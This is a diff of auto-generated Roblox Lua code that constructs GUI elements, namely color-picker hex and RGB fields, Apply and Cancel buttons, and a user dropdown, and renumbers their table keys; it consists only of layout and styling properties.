+G2L["2c4"]["Size"] = UDim2.new(0, 1, 1, 0);
+G2L["2c4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2c4"]["Name"] = [[line]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.transparency.transparencyFrame.slider.line.UIStroke
-G2L["296"] = Instance.new("UIStroke", G2L["295"]);
+G2L["2c5"] = Instance.new("UIStroke", G2L["2c4"]);
 
 
 
 -- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.transparency.transparencyFrame.UIPadding
-G2L["297"] = Instance.new("UIPadding", G2L["293"]);
-G2L["297"]["PaddingTop"] = UDim.new(0, 1);
-G2L["297"]["PaddingRight"] = UDim.new(0, 3);
-G2L["297"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["297"]["PaddingBottom"] = UDim.new(0, 1);
+G2L["2c6"] = Instance.new("UIPadding", G2L["2c2"]);
+G2L["2c6"]["PaddingTop"] = UDim.new(0, 1);
+G2L["2c6"]["PaddingRight"] = UDim.new(0, 3);
+G2L["2c6"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["2c6"]["PaddingBottom"] = UDim.new(0, 1);
 
 
 -- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue
-G2L["298"] = Instance.new("Frame", G2L["27e"]);
-G2L["298"]["BorderSizePixel"] = 0;
-G2L["298"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["298"]["Size"] = UDim2.new(1, 0, 0, 23);
-G2L["298"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["298"]["Name"] = [[colorvalue]];
-G2L["298"]["LayoutOrder"] = 4;
-G2L["298"]["BackgroundTransparency"] = 1;
+G2L["2c7"] = Instance.new("Frame", G2L["2ad"]);
+G2L["2c7"]["BorderSizePixel"] = 0;
+G2L["2c7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2c7"]["Size"] = UDim2.new(1, 0, 0, 23);
+G2L["2c7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2c7"]["Name"] = [[colorvalue]];
+G2L["2c7"]["LayoutOrder"] = 4;
+G2L["2c7"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.hex
-G2L["299"] = Instance.new("Frame", G2L["298"]);
-G2L["299"]["BorderSizePixel"] = 0;
-G2L["299"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["299"]["Size"] = UDim2.new(1, -100, 1, 0);
-G2L["299"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["299"]["Name"] = [[hex]];
-G2L["299"]["BackgroundTransparency"] = 1;
+G2L["2c8"] = Instance.new("Frame", G2L["2c7"]);
+G2L["2c8"]["BorderSizePixel"] = 0;
+G2L["2c8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2c8"]["Size"] = UDim2.new(1, -100, 1, 0);
+G2L["2c8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2c8"]["Name"] = [[hex]];
+G2L["2c8"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.hex.UIPadding
-G2L["29a"] = Instance.new("UIPadding", G2L["299"]);
-G2L["29a"]["PaddingTop"] = UDim.new(0, 2);
-G2L["29a"]["PaddingRight"] = UDim.new(0, 3);
-G2L["29a"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["29a"]["PaddingBottom"] = UDim.new(0, 2);
+G2L["2c9"] = Instance.new("UIPadding", G2L["2c8"]);
+G2L["2c9"]["PaddingTop"] = UDim.new(0, 2);
+G2L["2c9"]["PaddingRight"] = UDim.new(0, 3);
+G2L["2c9"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["2c9"]["PaddingBottom"] = UDim.new(0, 2);
 
 
 -- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.hex.textbox
-G2L["29b"] = Instance.new("TextBox", G2L["299"]);
-G2L["29b"]["Name"] = [[textbox]];
-G2L["29b"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-G2L["29b"]["PlaceholderColor3"] = Color3.fromRGB(201, 201, 201);
-G2L["29b"]["TextSize"] = 14;
-G2L["29b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["29b"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["29b"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["29b"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["29b"]["PlaceholderText"] = [[Hex color]];
-G2L["29b"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["29b"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["29b"]["Text"] = [[]];
+G2L["2ca"] = Instance.new("TextBox", G2L["2c8"]);
+G2L["2ca"]["Name"] = [[textbox]];
+G2L["2ca"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["2ca"]["PlaceholderColor3"] = Color3.fromRGB(201, 201, 201);
+G2L["2ca"]["TextSize"] = 14;
+G2L["2ca"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2ca"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["2ca"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2ca"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["2ca"]["PlaceholderText"] = [[Hex color]];
+G2L["2ca"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["2ca"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["2ca"]["Text"] = [[]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.hex.textbox.outlineStroke
-G2L["29c"] = Instance.new("UIStroke", G2L["29b"]);
-G2L["29c"]["ZIndex"] = 10;
-G2L["29c"]["Thickness"] = 2;
-G2L["29c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-G2L["29c"]["Name"] = [[outlineStroke]];
+G2L["2cb"] = Instance.new("UIStroke", G2L["2ca"]);
+G2L["2cb"]["ZIndex"] = 10;
+G2L["2cb"]["Thickness"] = 2;
+G2L["2cb"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+G2L["2cb"]["Name"] = [[outlineStroke]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.hex.textbox.buttonFade
-G2L["29d"] = Instance.new("CanvasGroup", G2L["29b"]);
-G2L["29d"]["BorderSizePixel"] = 0;
-G2L["29d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["29d"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["29d"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["29d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["29d"]["Name"] = [[buttonFade]];
+G2L["2cc"] = Instance.new("CanvasGroup", G2L["2ca"]);
+G2L["2cc"]["BorderSizePixel"] = 0;
+G2L["2cc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2cc"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2cc"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["2cc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2cc"]["Name"] = [[buttonFade]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.hex.textbox.buttonFade.UIGradient
-G2L["29e"] = Instance.new("UIGradient", G2L["29d"]);
-G2L["29e"]["Rotation"] = 90;
-G2L["29e"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+G2L["2cd"] = Instance.new("UIGradient", G2L["2cc"]);
+G2L["2cd"]["Rotation"] = 90;
+G2L["2cd"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
 
 
 -- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.hex.textbox.text
-G2L["29f"] = Instance.new("UIStroke", G2L["29b"]);
-G2L["29f"]["Name"] = [[text]];
+G2L["2ce"] = Instance.new("UIStroke", G2L["2ca"]);
+G2L["2ce"]["Name"] = [[text]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.hex.textbox.UIPadding
-G2L["2a0"] = Instance.new("UIPadding", G2L["29b"]);
-G2L["2a0"]["PaddingLeft"] = UDim.new(0, 6);
+G2L["2cf"] = Instance.new("UIPadding", G2L["2ca"]);
+G2L["2cf"]["PaddingLeft"] = UDim.new(0, 6);
 
 
 -- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.rgb
-G2L["2a1"] = Instance.new("Frame", G2L["298"]);
-G2L["2a1"]["BorderSizePixel"] = 0;
-G2L["2a1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["2a1"]["Size"] = UDim2.new(1, -100, 1, 0);
-G2L["2a1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["2a1"]["Name"] = [[rgb]];
-G2L["2a1"]["LayoutOrder"] = 1;
-G2L["2a1"]["BackgroundTransparency"] = 1;
-
-
--- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.rgb.UIPadding
-G2L["2a2"] = Instance.new("UIPadding", G2L["2a1"]);
-G2L["2a2"]["PaddingTop"] = UDim.new(0, 2);
-G2L["2a2"]["PaddingRight"] = UDim.new(0, 3);
-G2L["2a2"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["2a2"]["PaddingBottom"] = UDim.new(0, 2);
-
-
--- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.rgb.textbox
-G2L["2a3"] = Instance.new("TextBox", G2L["2a1"]);
-G2L["2a3"]["Name"] = [[textbox]];
-G2L["2a3"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-G2L["2a3"]["PlaceholderColor3"] = Color3.fromRGB(201, 201, 201);
-G2L["2a3"]["TextWrapped"] = true;
-G2L["2a3"]["TextSize"] = 14;
-G2L["2a3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["2a3"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["2a3"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["2a3"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["2a3"]["PlaceholderText"] = [[RGB color]];
-G2L["2a3"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["2a3"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["2a3"]["Text"] = [[]];
-
-
--- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.rgb.textbox.outlineStroke
-G2L["2a4"] = Instance.new("UIStroke", G2L["2a3"]);
-G2L["2a4"]["ZIndex"] = 10;
-G2L["2a4"]["Thickness"] = 2;
-G2L["2a4"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-G2L["2a4"]["Name"] = [[outlineStroke]];
-
-
--- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.rgb.textbox.buttonFade
-G2L["2a5"] = Instance.new("CanvasGroup", G2L["2a3"]);
-G2L["2a5"]["BorderSizePixel"] = 0;
-G2L["2a5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["2a5"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["2a5"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["2a5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["2a5"]["Name"] = [[buttonFade]];
-
-
--- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.rgb.textbox.buttonFade.UIGradient
-G2L["2a6"] = Instance.new("UIGradient", G2L["2a5"]);
-G2L["2a6"]["Rotation"] = 90;
-G2L["2a6"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
-
-
--- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.rgb.textbox.text
-G2L["2a7"] = Instance.new("UIStroke", G2L["2a3"]);
-G2L["2a7"]["Name"] = [[text]];
-
-
--- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.rgb.textbox.UIPadding
-G2L["2a8"] = Instance.new("UIPadding", G2L["2a3"]);
-G2L["2a8"]["PaddingLeft"] = UDim.new(0, 6);
-
-
--- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.UIListLayout
-G2L["2a9"] = Instance.new("UIListLayout", G2L["298"]);
-G2L["2a9"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
-G2L["2a9"]["FillDirection"] = Enum.FillDirection.Horizontal;
-
-
--- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel
-G2L["2aa"] = Instance.new("Frame", G2L["27e"]);
-G2L["2aa"]["BorderSizePixel"] = 0;
-G2L["2aa"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["2aa"]["Size"] = UDim2.new(1, 0, 0, 23);
-G2L["2aa"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["2aa"]["Name"] = [[applycancel]];
-G2L["2aa"]["LayoutOrder"] = 5;
-G2L["2aa"]["BackgroundTransparency"] = 1;
-
-
--- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.UIListLayout
-G2L["2ab"] = Instance.new("UIListLayout", G2L["2aa"]);
-G2L["2ab"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
-G2L["2ab"]["FillDirection"] = Enum.FillDirection.Horizontal;
-
-
--- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.apply
-G2L["2ac"] = Instance.new("TextButton", G2L["2aa"]);
-G2L["2ac"]["BorderSizePixel"] = 0;
-G2L["2ac"]["TextTransparency"] = 1;
-G2L["2ac"]["TextSize"] = 14;
-G2L["2ac"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["2ac"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["2ac"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["2ac"]["BackgroundTransparency"] = 1;
-G2L["2ac"]["Size"] = UDim2.new(0, 100, 1, 0);
-G2L["2ac"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["2ac"]["Name"] = [[apply]];
-
-
--- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.apply.UIPadding
-G2L["2ad"] = Instance.new("UIPadding", G2L["2ac"]);
-G2L["2ad"]["PaddingTop"] = UDim.new(0, 2);
-G2L["2ad"]["PaddingRight"] = UDim.new(0, 3);
-G2L["2ad"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["2ad"]["PaddingBottom"] = UDim.new(0, 2);
-
-
--- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.apply.buttonFrame
-G2L["2ae"] = Instance.new("Frame", G2L["2ac"]);
-G2L["2ae"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["2ae"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["2ae"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["2ae"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["2ae"]["Name"] = [[buttonFrame]];
-
-
--- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.apply.buttonFrame.outlineStroke
-G2L["2af"] = Instance.new("UIStroke", G2L["2ae"]);
-G2L["2af"]["ZIndex"] = 10;
-G2L["2af"]["Thickness"] = 2;
-G2L["2af"]["Name"] = [[outlineStroke]];
-
-
--- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.apply.text
-G2L["2b0"] = Instance.new("TextLabel", G2L["2ac"]);
-G2L["2b0"]["ZIndex"] = 2;
-G2L["2b0"]["BorderSizePixel"] = 0;
-G2L["2b0"]["TextSize"] = 14;
-G2L["2b0"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["2b0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["2b0"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["2b0"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["2b0"]["BackgroundTransparency"] = 1;
-G2L["2b0"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["2b0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["2b0"]["Text"] = [[Apply]];
-G2L["2b0"]["Name"] = [[text]];
-
-
--- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.apply.text.text
-G2L["2b1"] = Instance.new("UIStroke", G2L["2b0"]);
-G2L["2b1"]["Name"] = [[text]];
-
-
--- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.cancel
-G2L["2b2"] = Instance.new("TextButton", G2L["2aa"]);
-G2L["2b2"]["BorderSizePixel"] = 0;
-G2L["2b2"]["TextTransparency"] = 1;
-G2L["2b2"]["TextSize"] = 14;
-G2L["2b2"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["2b2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["2b2"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["2b2"]["BackgroundTransparency"] = 1;
-G2L["2b2"]["Size"] = UDim2.new(0, 100, 1, 0);
-G2L["2b2"]["LayoutOrder"] = 1;
-G2L["2b2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["2b2"]["Name"] = [[cancel]];
-
-
--- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.cancel.UIPadding
-G2L["2b3"] = Instance.new("UIPadding", G2L["2b2"]);
-G2L["2b3"]["PaddingTop"] = UDim.new(0, 2);
-G2L["2b3"]["PaddingRight"] = UDim.new(0, 3);
-G2L["2b3"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["2b3"]["PaddingBottom"] = UDim.new(0, 2);
-
-
--- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.cancel.buttonFrame
-G2L["2b4"] = Instance.new("Frame", G2L["2b2"]);
-G2L["2b4"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["2b4"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["2b4"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["2b4"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["2b4"]["Name"] = [[buttonFrame]];
-
-
--- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.cancel.buttonFrame.outlineStroke
-G2L["2b5"] = Instance.new("UIStroke", G2L["2b4"]);
-G2L["2b5"]["ZIndex"] = 10;
-G2L["2b5"]["Thickness"] = 2;
-G2L["2b5"]["Name"] = [[outlineStroke]];
-
-
--- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.cancel.buttonFrame.buttonFade
-G2L["2b6"] = Instance.new("CanvasGroup", G2L["2b4"]);
-G2L["2b6"]["BorderSizePixel"] = 0;
-G2L["2b6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["2b6"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["2b6"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["2b6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["2b6"]["Name"] = [[buttonFade]];
-
-
--- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.cancel.buttonFrame.buttonFade.UIGradient
-G2L["2b7"] = Instance.new("UIGradient", G2L["2b6"]);
-G2L["2b7"]["Rotation"] = 90;
-G2L["2b7"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
-
-
--- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.cancel.text
-G2L["2b8"] = Instance.new("TextLabel", G2L["2b2"]);
-G2L["2b8"]["ZIndex"] = 2;
-G2L["2b8"]["BorderSizePixel"] = 0;
-G2L["2b8"]["TextSize"] = 14;
-G2L["2b8"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["2b8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["2b8"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["2b8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["2b8"]["BackgroundTransparency"] = 1;
-G2L["2b8"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["2b8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["2b8"]["Text"] = [[Cancel]];
-G2L["2b8"]["Name"] = [[text]];
-
-
--- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.cancel.text.text
-G2L["2b9"] = Instance.new("UIStroke", G2L["2b8"]);
-G2L["2b9"]["Name"] = [[text]];
-
-
--- StarterGui.T5784YHRGE89ES98T.ColorPicker.colorpickerFade
-G2L["2ba"] = Instance.new("CanvasGroup", G2L["27c"]);
-G2L["2ba"]["BorderSizePixel"] = 0;
-G2L["2ba"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["2ba"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["2ba"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["2ba"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["2ba"]["Name"] = [[colorpickerFade]];
-
-
--- StarterGui.T5784YHRGE89ES98T.ColorPicker.colorpickerFade.UIGradient
-G2L["2bb"] = Instance.new("UIGradient", G2L["2ba"]);
-G2L["2bb"]["Rotation"] = 90;
-G2L["2bb"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
-
-
--- StarterGui.T5784YHRGE89ES98T.Dropdown
-G2L["2bc"] = Instance.new("Frame", G2L["1"]);
-G2L["2bc"]["ZIndex"] = 1000000010;
-G2L["2bc"]["BorderSizePixel"] = 0;
-G2L["2bc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["2bc"]["Size"] = UDim2.new(0, 162, 0, 100);
-G2L["2bc"]["Position"] = UDim2.new(0.60349, 0, 0.36966, 0);
-G2L["2bc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["2bc"]["Name"] = [[Dropdown]];
-G2L["2bc"]["BackgroundTransparency"] = 0.99;
-
-
--- StarterGui.T5784YHRGE89ES98T.Dropdown.UIListLayout
-G2L["2bd"] = Instance.new("UIListLayout", G2L["2bc"]);
-G2L["2bd"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
-
-
--- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownSelectAll
-G2L["2be"] = Instance.new("Frame", G2L["2bc"]);
-G2L["2be"]["BorderSizePixel"] = 0;
-G2L["2be"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["2be"]["Size"] = UDim2.new(1, 0, 0, 20);
-G2L["2be"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["2be"]["Name"] = [[dropdownSelectAll]];
-G2L["2be"]["LayoutOrder"] = 1;
-
-
--- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownSelectAll.selectall
-G2L["2bf"] = Instance.new("TextButton", G2L["2be"]);
-G2L["2bf"]["TextSize"] = 12;
-G2L["2bf"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["2bf"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
-G2L["2bf"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["2bf"]["Size"] = UDim2.new(0.5, 0, 1, 0);
-G2L["2bf"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["2bf"]["Text"] = [[Select All]];
-G2L["2bf"]["Name"] = [[selectall]];
-
-
--- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownSelectAll.selectall.buttonFade
-G2L["2c0"] = Instance.new("CanvasGroup", G2L["2bf"]);
-G2L["2c0"]["Visible"] = false;
-G2L["2c0"]["BorderSizePixel"] = 0;
-G2L["2c0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["2c0"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["2c0"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["2c0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["2c0"]["Name"] = [[buttonFade]];
-
-
--- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownSelectAll.selectall.buttonFade.UIGradient
-G2L["2c1"] = Instance.new("UIGradient", G2L["2c0"]);
-G2L["2c1"]["Rotation"] = 90;
-G2L["2c1"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
-
-
--- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownSelectAll.selectall.text
-G2L["2c2"] = Instance.new("UIStroke", G2L["2bf"]);
-G2L["2c2"]["Name"] = [[text]];
-
-
--- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownSelectAll.unselectall
-G2L["2c3"] = Instance.new("TextButton", G2L["2be"]);
-G2L["2c3"]["TextSize"] = 12;
-G2L["2c3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["2c3"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
-G2L["2c3"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["2c3"]["Size"] = UDim2.new(0.5, 0, 1, 0);
-G2L["2c3"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["2c3"]["Text"] = [[Unselect All]];
-G2L["2c3"]["Name"] = [[unselectall]];
-G2L["2c3"]["Position"] = UDim2.new(0.5, 0, 0, 0);
-
-
--- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownSelectAll.unselectall.buttonFade
-G2L["2c4"] = Instance.new("CanvasGroup", G2L["2c3"]);
-G2L["2c4"]["Visible"] = false;
-G2L["2c4"]["BorderSizePixel"] = 0;
-G2L["2c4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["2c4"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["2c4"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["2c4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["2c4"]["Name"] = [[buttonFade]];
-
-
--- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownSelectAll.unselectall.buttonFade.UIGradient
-G2L["2c5"] = Instance.new("UIGradient", G2L["2c4"]);
-G2L["2c5"]["Rotation"] = 90;
-G2L["2c5"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
-
-
--- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownSelectAll.unselectall.text
-G2L["2c6"] = Instance.new("UIStroke", G2L["2c3"]);
-G2L["2c6"]["Name"] = [[text]];
-
-
--- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownUsers
-G2L["2c7"] = Instance.new("Frame", G2L["2bc"]);
-G2L["2c7"]["BorderSizePixel"] = 0;
-G2L["2c7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["2c7"]["Size"] = UDim2.new(1, 0, 0, 20);
-G2L["2c7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["2c7"]["Name"] = [[dropdownUsers]];
-G2L["2c7"]["LayoutOrder"] = 2;
-
-
--- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownUsers.display
-G2L["2c8"] = Instance.new("TextButton", G2L["2c7"]);
-G2L["2c8"]["TextWrapped"] = true;
-G2L["2c8"]["TextSize"] = 12;
-G2L["2c8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["2c8"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
-G2L["2c8"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["2c8"]["Size"] = UDim2.new(0.5, 0, 1, 0);
-G2L["2c8"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["2c8"]["Text"] = [[Show Display]];
-G2L["2c8"]["Name"] = [[display]];
-
-
--- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownUsers.display.buttonFade
-G2L["2c9"] = Instance.new("CanvasGroup", G2L["2c8"]);
